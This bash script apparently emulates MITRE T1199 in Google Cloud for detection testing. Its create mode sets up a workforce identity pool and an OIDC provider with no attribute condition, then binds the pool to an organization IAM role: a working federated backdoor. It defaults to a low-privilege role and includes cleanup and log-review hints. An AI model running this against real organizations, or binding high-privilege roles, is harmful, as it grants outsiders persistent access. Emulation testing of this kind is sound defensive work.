#!/usr/bin/env bash
# T1199 Trusted Relationship — GCP Workforce Identity Federation backdoor.
#
# Creates a workforce identity pool and an external OIDC provider with NO attribute condition
# (so any identity the external IdP asserts is accepted) and binds the pool's principalSet
# directly to an organization IAM role — an external, org-scoped federated identity with no
# service-account / workloadIdentityUser step.
#
# SAFETY: binds a low-privilege role by default (roles/browser); a real intrusion would bind
# roles/owner. Run only against an organization you control. 'cleanup' removes the binding,
# the provider, and the pool; a missing object is not an error, but a revert that fails for
# another reason makes cleanup exit non-zero and name what stays. Requires gcloud
# authenticated with rights to manage workforce pools and set IAM policy at organization scope.
#
# A workforce pool ID must be unique across all of Google Cloud, and Google blocks the ID of
# a deleted pool for about 30 days. The default pool/provider IDs carry the organization ID
# (atomic-ext-pool-<ORG>), so two organizations do not collide; a second run in the SAME
# organization within 30 days needs a new POOL value. create and cleanup compute the same
# default, so cleanup finds what create made with no saved state.
#
#   emulate_gcp_workforce.sh create  ORG POOL PROVIDER ISSUER ROLE
#   emulate_gcp_workforce.sh cleanup ORG POOL PROVIDER ISSUER ROLE
set -euo pipefail

USAGE='usage: emulate_gcp_workforce.sh {create|cleanup} ORG POOL PROVIDER ISSUER ROLE'
MODE="${1:?$USAGE}"
ORG="${2:?organization id required}"
# The default pool/provider IDs carry the organization ID, so they are unique for all of
# Google Cloud without saved state (both create and cleanup compute them the same way).
POOL="${3:-atomic-ext-pool-${ORG}}"
PROVIDER="${4:-atomic-ext-idp-${ORG}}"
ISSUER="${5:-https://issuer.example.com}"
ROLE="${6:-roles/browser}"
MEMBER="principalSet://iam.googleapis.com/locations/global/workforcePools/${POOL}/*"

command -v gcloud >/dev/null 2>&1 || { echo "gcloud CLI not found" >&2; exit 1; }

create() {
  echo "[*] creating workforce pool '$POOL' on organization $ORG"
  gcloud iam workforce-pools create "$POOL" --organization="$ORG" --location=global \
    --display-name="atomic ext pool"
  echo "[*] creating OIDC provider '$PROVIDER' with NO attribute condition (issuer $ISSUER)"
  # The provider is identified by its pool, not the organization: providers create-oidc has no
  # --organization option. A workforce OIDC provider needs --client-id; the implicit flow
  # (--web-sso-response-type=id-token) needs no client secret.
  gcloud iam workforce-pools providers create-oidc "$PROVIDER" \
    --location=global --workforce-pool="$POOL" --issuer-uri="$ISSUER" --client-id="$POOL" \
    --attribute-mapping="google.subject=assertion.sub" \
    --web-sso-response-type=id-token \
    --web-sso-assertion-claims-behavior=only-id-token-claims
  echo "[*] binding $MEMBER -> $ROLE on organization $ORG"
  # --condition=None so a non-interactive run adds no condition and is not prompted when the
  # organization policy already holds a binding with a condition.
  gcloud organizations add-iam-policy-binding "$ORG" --role="$ROLE" --member="$MEMBER" --condition=None
  echo "[*] done. Review the organization's Admin Activity log for CreateWorkforcePoolProvider"
  echo "    (empty attributeCondition) and the cloudresourcemanager SetIamPolicy principalSet binding."
}

cleanup() {
  echo "[*] removing binding / provider / pool (idempotent)"
  # A revert that fails only because the object is already gone is not an error (idempotent):
  # gcloud exits non-zero for NOT_FOUND, so each line reads the error text and stays silent
  # for a missing object. Any OTHER failure prints one note and makes cleanup exit 1, so a
  # real leftover (for example no permission) is visible and does not look like success.
  local left=0 err
  _revert() {   # _revert <label> <gcloud args...>
    local label="$1"; shift
    if ! err="$("$@" 2>&1)"; then
      if printf '%s' "$err" | grep -qiE 'not.?found|does not exist|NOT_FOUND'; then
        return 0   # already gone
      fi
      echo "[!] not removed: $label" >&2
      printf '%s\n' "$err" >&2
      left=1
    fi
  }
  _revert "organization binding $MEMBER -> $ROLE" \
    gcloud organizations remove-iam-policy-binding "$ORG" --role="$ROLE" --member="$MEMBER" \
    --condition=None --quiet
  _revert "provider $PROVIDER" \
    gcloud iam workforce-pools providers delete "$PROVIDER" --location=global \
    --workforce-pool="$POOL" --quiet
  _revert "workforce pool $POOL" \
    gcloud iam workforce-pools delete "$POOL" --location=global --quiet
  if [[ "$left" -ne 0 ]]; then
    echo "[!] cleanup did not remove everything; see the notes above." >&2
    exit 1
  fi
}

case "$MODE" in
  create) create ;;
  cleanup) cleanup ;;
  *) echo "$USAGE" >&2; exit 1 ;;
esac
